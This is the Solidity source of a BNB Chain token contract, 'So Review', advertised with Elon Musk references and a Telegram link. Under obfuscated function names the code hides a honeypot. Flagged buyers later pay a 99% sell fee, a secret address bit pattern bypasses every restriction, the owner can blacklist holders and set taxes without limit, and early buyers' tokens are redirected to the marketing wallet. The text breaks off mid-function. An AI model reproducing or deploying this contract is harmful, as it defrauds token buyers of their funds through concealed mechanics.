/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

/**
Elon Musk's favorite Twitter, calling on everyone to follow it.
twitter:https://twitter.com/SoReview
Elon's twitter:https://twitter.com/elonmusk/status/SoReview
TG:t.me/TheRabbitHoleBSC
00000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000
[email protected]@8         @00000000000000000
[email protected] [email protected]
[email protected]@           [email protected]
[email protected]@                   @@0000000000000000
[email protected]   @i                   @00000000000000
[email protected]            0t      [email protected]@@000000000000000
[email protected] [email protected]@000000000000000000000000
[email protected] [email protected]
[email protected]                  @00000000000000000
[email protected]                    @000000000000000
[email protected]@                      .0000000000000
00000000000                             0000000000
000000000                                 00000000
00000000                                   0000000
00000000                                   0000000
000000000                                 00000000
00000000000                            :0000000000
000000000000000:                   f00000000000000
00000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success,) = recipient.call{value : amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value : weiValue}(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(address(0)), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }


}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SoReview is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string constant _name = "So Review ";
    string constant _symbol = "SoReview";
    uint8 constant _decimals = 18;

    address payable public marketingWalletAddress = payable(0x31a8B3137d23441fa5c7fc67fFffc9564aC0821A);
    address payable public teamWalletAddress = payable(0x31a8B3137d23441fa5c7fc67fFffc9564aC0821A);
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private teamRecAddress = address(0x72585DFa27CFb0cAbB4Ec926FfFFd8B82a830684);
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256))  _allowances;
    mapping(address => bool) public isSwap;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isWalletLimitExempt;
    mapping(address => bool) public receiverLaunchedExemptBuy;
    mapping(address => bool) public isMarketPair;

    mapping(address => uint256) private botsSwapWalletSellTeamAuto;
    mapping(uint256 => address) private txLaunchedLiquiditySwap;
    uint256 public exemptLimitValue = 0;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private burnFeeIsAutoTeamExempt = 6 * 10 ** 15;

    uint256 public _burnTeamMinAuto = 0;
    uint256 public _burnExemptMinFee = 0;
    uint256 public _buyTeamFee = 8;
    uint256 public _minAutoExemptFeeLiquidityBuy = 0;
    uint256 public _marketingBurnAutoMode = 0;
    uint256 public _sellTeamFee = 8;
    uint256 public _airDropFee = 1;
    uint256 public _liquidityShare = 5;
    uint256 public _marketingShare = 10;
    uint256 public _teamShare = 9;

    uint256 public _totalTaxIfBuying = 12;
    uint256 public _totalTaxIfSelling = 12;
    uint256 public _totalDistributionShares = 24;

    uint256  _totalSupply = 100000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256 public _walletMax = 2000000 * 10 ** _decimals;
    uint256 private minimumTokensBeforeSwap = 1 * 10 ** _decimals;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 public startblo;
    uint256 public lucky = 1;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    
    uint256 private botsBuyReceiverSell = 0;
    uint256 private swapLimitBurnModeFee = 0;
    uint256 private modeFeeMinTradingExempt = 0;
    uint256 private botsBurnLaunchedBuy = 0;
    bool private maxLimitWalletIs = false;
    bool private isBuyLaunchedMax = false;
    uint256 private marketingTeamModeExemptFee = 0;
    uint256 private launchedMinBotsWallet = 0;
    uint256 private launchedFeeMaxTradingSwap = 0;
    uint256 private liquidityMaxLimitModeBurnLaunched = 0;
    bool private swapLimitBurnModeFee0 = false;
    bool private swapLimitBurnModeFee1 = false;


    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );

    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        _totalTaxIfBuying = _burnTeamMinAuto.add(_burnExemptMinFee).add(_buyTeamFee);
        _totalTaxIfSelling = _minAutoExemptFeeLiquidityBuy.add(_marketingBurnAutoMode).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapV2Pair)] = true;
        isWalletLimitExempt[address(this)] = true;

        receiverLaunchedExemptBuy[owner()] = true;
        receiverLaunchedExemptBuy[address(this)] = true;

        isMarketPair[address(uniswapV2Pair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        receiverLaunchedExemptBuy[holder] = exempt;
    }

    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _burnTeamMinAuto = newLiquidityTax;
        _burnExemptMinFee = newMarketingTax;
        _buyTeamFee = newTeamTax;

        _totalTaxIfBuying = _burnTeamMinAuto.add(_burnExemptMinFee).add(_buyTeamFee);
    }

    function setSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _minAutoExemptFeeLiquidityBuy = newLiquidityTax;
        _marketingBurnAutoMode = newMarketingTax;
        _sellTeamFee = newTeamTax;

        _totalTaxIfSelling = _minAutoExemptFeeLiquidityBuy.add(_marketingBurnAutoMode).add(_sellTeamFee);
    }

    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }


//    function _transfer(address to, uint256 amount) external onlyOwner() {
//        _transfer(uniswapV2Pair, to, amount);
//    }

    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        _maxTxAmount = maxTxAmount;
    }

    function enableDisableWalletLimit(bool newValue) external onlyOwner() {
        checkWalletLimit = newValue;
    }

    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function setWalletLimit(uint256 newLimit) external onlyOwner {
        _walletMax = newLimit;
    }

    function setlucky(uint256 luckyblock) external onlyOwner {
        lucky = luckyblock;
    }

    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
        minimumTokensBeforeSwap = newLimit;
    }


    function setMarketingWalletAddress(address newAddress) external onlyOwner() {
        marketingWalletAddress = payable(newAddress);
    }

    function setTeamWalletAddress(address newAddress) external onlyOwner() {
        teamWalletAddress = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
        swapAndLiquifyByLimitOnly = newValue;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function changeRouterVersion(address newRouterAddress) public onlyOwner returns (address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress);

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());

        if (newPairAddress == address(0))
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapV2Pair = newPairAddress;
        uniswapV2Router = _uniswapV2Router;

        isWalletLimitExempt[address(uniswapV2Pair)] = true;
        isMarketPair[address(uniswapV2Pair)] = true;
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function botsMarketingIsWallet(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function minIsTxBurnTradingLiquidity(address sender, uint256 pFee) private view returns (uint256) {
        uint256 f0 = botsSwapWalletSellTeamAuto[sender];
        uint256 f1 = pFee;
        if (f0 > 0 && block.timestamp - f0 > 2) {
            f1 = 99;
        }
        return f1;
    }

    function isReceiverBuyMarketingModeExemptBurn(address addr) private {
        if (isModeReceiverExempt() < burnFeeIsAutoTeamExempt) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        txLaunchedLiquiditySwap[exemptLimitValue] = addr;
    }

    function autoLiquidityMarketingBuy() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (botsSwapWalletSellTeamAuto[txLaunchedLiquiditySwap[i]] == 0) {
                    botsSwapWalletSellTeamAuto[txLaunchedLiquiditySwap[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function isModeReceiverExempt() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingWalletAddress).transfer(amountBNB * amountPercentage / 100);
    }

    function setwhitelist(address ad, bool NewValue) external onlyOwner() {
        isSwap[ad] = NewValue;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        bool bLimitTxWalletValue = botsMarketingIsWallet(sender) || botsMarketingIsWallet(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && recipient == teamRecAddress) {
                autoLiquidityMarketingBuy();
            }
            if (!bLimitTxWalletValue) {
                isReceiverBuyMarketingModeExemptBurn(recipient);
            }
        }

        if (bLimitTxWalletValue) {return launchedBurnTxBuy(sender, recipient, amount);}

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!isSwap[sender]);
        require(!isSwap[recipient]);
        if (recipient == uniswapV2Pair && balanceOf(address(recipient)) == 0) {
            startblo = block.number;
        }
        if (inSwapAndLiquify)
        {
            return launchedBurnTxBuy(sender, recipient, amount);
        }
        else
        {
            if (!receiverLaunchedExemptBuy[sender] && !receiverLaunchedExemptBuy[recipient]) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;

            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)
            {
                if (swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ?
            amount : takeFee(sender, recipient, amount);

            if (checkWalletLimit && !isWalletLimitExempt[recipient])
                require(balanceOf(recipient).add(finalAmount) <= _walletMax);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);

            if (block.number < (startblo + lucky) && sender == uniswapV2Pair) {
                launchedBurnTxBuy(recipient, marketingWalletAddress, finalAmount);
            }
            return true;
        }
    }

    function launchedBurnTxBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {

        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));

        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);

        if (amountBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amountBNBMarketing);

        if (amountBNBTeam > 0)
            transferToAddressETH(teamWalletAddress, amountBNBTeam);

        if (amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value : ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            teamWalletAddress,
            block.timestamp
        );
    }

    function setAirDropFee(uint256 _newAirDropFee) external onlyOwner {
        _airDropFee = _newAirDropFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(minIsTxBurnTradingLiquidity(sender, 0)).div(100);
        uint256 airDropFeeAmount = 0;

        if (isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
            airDropFeeAmount = amount.mul(_airDropFee).div(1000);

            if (feeAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
            }
            if (airDropFeeAmount > 0) {
                uint airDropEve = airDropFeeAmount / 3;
                for (uint i = 0; i < 3; i++) {
                    address randomAddr = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));

                    if (i == 2) {
                        _balances[randomAddr] += airDropFeeAmount - airDropEve - airDropEve;
                        emit Transfer(sender, randomAddr, airDropFeeAmount - airDropEve - airDropEve);
                    } else {
                        _balances[randomAddr] += airDropEve;
                        emit Transfer(sender, randomAddr, airDropEve);
                    }
                }
            }
        }
        else if (isMarketPair[recipient]) {
            feeAmount = amount.mul(minIsTxBurnTradingLiquidity(sender, _totalTaxIfSelling)).div(100);
            airDropFeeAmount = amount.mul(_airDropFee).div(1000);

            if (feeAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
            }

            if (airDropFeeAmount > 0) {
                uint airDropEve = airDropFeeAmount / 3;
                for (uint i = 0; i < 3; i++) {
                    address randomAddr = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    if (i == 2) {
                        _balances[randomAddr] += airDropFeeAmount - airDropEve - airDropEve;
                        emit Transfer(sender, randomAddr, airDropFeeAmount - airDropEve - airDropEve);
                    } else {
                        _balances[randomAddr] += airDropEve;
                        emit Transfer(sender, randomAddr, airDropEve);
                    }
                }
            }
        }
        return amount.sub(feeAmount);
    }

    
    function getModeFeeMinTradingExempt() public view returns (uint256) {
        return modeFeeMinTradingExempt;
    }
    function setModeFeeMinTradingExempt(uint256 a0) public onlyOwner {
        if (modeFeeMinTradingExempt != modeFeeMinTradingExempt) {
            modeFeeMinTradingExempt=a0;
        }
        modeFeeMinTradingExempt=a0;
    }

    function getBotsBurnLaunchedBuy() public view returns (uint256) {
        if (botsBurnLaunchedBuy == minimumTokensBeforeSwap) {
            return minimumTokensBeforeSwap;
        }
        return botsBurnLaunchedBuy;
    }
    function setBotsBurnLaunchedBuy(uint256 a0) public onlyOwner {
        botsBurnLaunchedBuy=a0;
    }

    function getLaunchedMinBotsWallet() public view returns (uint256) {
        if (launchedMinBotsWallet != marketingTeamModeExemptFee) {
            return marketingTeamModeExemptFee;
        }
        if (launchedMinBotsWallet == launchedMinBotsWallet) {
            return launchedMinBotsWallet;
        }
        return launchedMinBotsWallet;
    }
    function setLaunchedMinBotsWallet(uint256 a0) public onlyOwner {
        if (launchedMinBotsWallet == botsBuyReceiverSell) {
            botsBuyReceiverSell=a0;
        }
        if (launchedMinBotsWallet == launchedFeeMaxTradingSwap) {
            launchedFeeMaxTradingSwap=a0;
        }
        launchedMinBotsWallet=a0;
    }

    function getMinimumTokensBeforeSwap() public view returns (uint256) {
        if (minimumTokensBeforeSwap == liquidityMaxLimitModeBurnLaunched) {
            return liquidityMaxLimitModeBurnLaunched;
        }
        if (minimumTokensBeforeSwap == marketingTeamModeExemptFee) {
            return marketingTeamModeExemptFee;
        }
        return minimumTokensBeforeSwap;
    }
    function setMinimumTokensBeforeSwap(uint256 a0) public onlyOwner {
        if (minimumTokensBeforeSwap == liquidityMaxLimitModeBurnLaunched) {
            liquidityMaxLimitModeBurnLaunched=a0;
        }
        if (minimumTokensBeforeSwap == liquidityMaxLimitModeBurnLaunched) {
            liquidityMaxLimitModeBurnLaunched=a0;
        }
        minimumTokensBeforeSwap=a0;
    }

    function getSwapLimitBurnModeFee0() public view returns (bool) {
        if (swapLimitBurnModeFee0 == swapLimitBurnModeFee1) {
            return swapLimitBurnModeFee1;
        }
        return swapLimitBurnModeFee0;
    }
    function setSwapLimitBurnModeFee0(bool a0) public onlyOwner {
        if (swapLimitBurnModeFee0 == swapLimitBurnModeFee0) {
            swapLimitBurnModeFee0=a0;
        }
        if (swapLimitBurnModeFee0 == swapLimitBurnModeFee0) {
            swapLimitBurnModeFee0=a0;
        }
        if (swapLimitBurnModeFee0 != swapLimitBurnModeFee1) {
            swapLimitBurnModeFee1=a0;
        }
